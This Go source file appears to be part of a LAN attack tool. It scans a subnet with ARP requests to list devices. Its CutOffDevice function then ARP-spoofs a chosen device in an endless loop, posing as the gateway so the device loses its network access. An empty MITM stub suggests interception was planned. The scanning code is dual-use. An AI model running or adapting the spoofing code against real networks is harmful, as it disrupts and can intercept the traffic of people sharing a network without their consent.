package networkscan

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"sort"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Device struct {
	IP       net.IP
	MAC      net.HardwareAddr
	HOSTNAME []string
}

type NetworkScanner struct {
	handle    *pcap.Handle
	localIP   net.IP
	localMAC  net.HardwareAddr
	localNet  *net.IPNet
	ifaceName string
}

func NewNetworkScanner(ifaceName string) *NetworkScanner {
	if ifaceName == "" || ifaceName == "auto" {
		ifaceName = detectInterfaceName()
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening device %s: %v", ifaceName, err)
	}

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("Error getting interface %s: %v", ifaceName, err)
	}

	localIP, localNet := ipv4Addr(iface)
	localMAC := iface.HardwareAddr

	return &NetworkScanner{
		handle:    handle,
		localIP:   localIP,
		localMAC:  localMAC,
		localNet:  localNet,
		ifaceName: ifaceName,
	}
}

func (ns *NetworkScanner) DefaultCIDR() string {
	if ns.localNet == nil {
		return ""
	}
	networkIP := ns.localNet.IP.Mask(ns.localNet.Mask)
	return (&net.IPNet{IP: networkIP, Mask: ns.localNet.Mask}).String()
}

func (ns *NetworkScanner) NetScan(targetNet string) []Device {
	_, ipNet, err := net.ParseCIDR(targetNet)
	if err != nil {
		log.Fatalf("Error parsing CIDR: %v", err)
	}
	fmt.Printf("Scanning network %s...\n", ipNet)

	done := make(chan bool)
	defer close(done)

	go func() {
		for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); IncrementIP(ip) {
			if ip.Equal(ns.localIP) {
				continue
			}
			go SendARPRequest(ns.handle, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ns.localMAC, ns.localIP, ip)
			time.Sleep(250 * time.Millisecond)
		}
		time.Sleep(1 * time.Second)
		done <- true
	}()

	fmt.Println("Waiting for responses...")

	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
	devicesByIP := make(map[string]Device)

	for {
		select {
		case packet := <-packetSource.Packets():
			device := HandleARPPacket(packet)
			if device.IP != nil && device.MAC != nil {
				key := device.IP.String()
				if _, exists := devicesByIP[key]; !exists {
					devicesByIP[key] = device
					fmt.Printf("Discovered device: IP=%s, MAC=%s, HOSTNAME: %s\n", device.IP, device.MAC, device.HOSTNAME)
				}
			}
		case <-done:
			fmt.Println("Stopping packet capture after scan completion.")
			devices := make([]Device, 0, len(devicesByIP))
			for _, device := range devicesByIP {
				devices = append(devices, device)
			}
			sort.Slice(devices, func(i, j int) bool {
				return bytes.Compare(devices[i].IP, devices[j].IP) < 0
			})
			return devices
		}
	}
}

func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {
	for {
		routerIp := net.ParseIP(gateway).To4()
		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
		time.Sleep(2 * time.Second)
	}
}

func MITM(device Device) {
}

func (ns *NetworkScanner) Close() {
	ns.handle.Close()
}

func detectInterfaceName() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Fatalf("Error listing interfaces: %v", err)
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		if _, _ = ipv4Addr(&iface); true {
			return iface.Name
		}
	}

	log.Fatal("No suitable network interface with IPv4 address found")
	return ""
}

func ipv4Addr(iface *net.Interface) (net.IP, *net.IPNet) {
	addrs, err := iface.Addrs()
	if err != nil {
		log.Fatalf("Error getting addresses for interface %s: %v", iface.Name, err)
	}
	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		ip := ipNet.IP.To4()
		if ip != nil {
			return ip, &net.IPNet{IP: ip, Mask: ipNet.Mask}
		}
	}
	log.Fatalf("No IPv4 address found for interface %s", iface.Name)
	return nil, nil
}
